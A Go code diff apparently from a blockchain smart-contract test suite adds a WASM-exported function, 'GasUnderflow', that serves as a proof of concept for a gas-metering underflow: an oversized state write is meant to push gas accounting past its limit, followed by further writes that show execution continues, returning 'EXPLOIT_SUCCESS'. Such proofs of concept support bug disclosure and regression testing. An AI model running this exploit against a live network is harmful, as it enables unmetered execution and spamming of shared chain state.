@@ -366,6 +366,37 @@ func InfRecursion(a *string) *string {
 	return sdk.ContractCall(*contractId, "infiniteRecursion", "a", nil)
 }
 
+//go:wasmexport gasUnderflow
+func GasUnderflow(a *string) *string {
+	// Step 1: Small write — should succeed within gas budget
+	sdk.Log("step1: small write")
+	sdk.StateSetObject("poc-small", "ok")
+
+	// Step 2: Large write — 200 bytes key+value to trigger underflow
+	// Gas cost = 200 * 19 * 100,000 = 380,000,000
+	// With rc_limit=1000, budget = 100,000,000 — this exceeds it
+	bigKey := "poc-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+	bigVal := "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+	sdk.Log("step2: large write to trigger underflow")
+	sdk.StateSetObject(bigKey, bigVal)
+
+	// Step 3: If we get here, gas underflow happened — we should be out of gas but aren't
+	sdk.Log("step3: post-underflow — should NOT reach here if gas is enforced")
+	sdk.StateSetObject("poc-proof1", "still-running")
+	sdk.StateSetObject("poc-proof2", "gas-is-infinite")
+	sdk.StateSetObject("poc-proof3", "unlimited-writes")
+
+	// Step 4: Do 20 more writes to prove unlimited execution
+	for i := 0; i < 20; i++ {
+		key := "poc-spam-" + strconv.Itoa(i)
+		sdk.StateSetObject(key, "should-be-blocked")
+	}
+
+	sdk.Log("step4: completed 20+ writes after gas should have been exhausted")
+	ret := "EXPLOIT_SUCCESS"
+	return &ret
+}
+
 //go:wasmexport createKey
 func CreateKey(a *string) *string {
 	status := sdk.TssCreateKey("main", "eddsa")
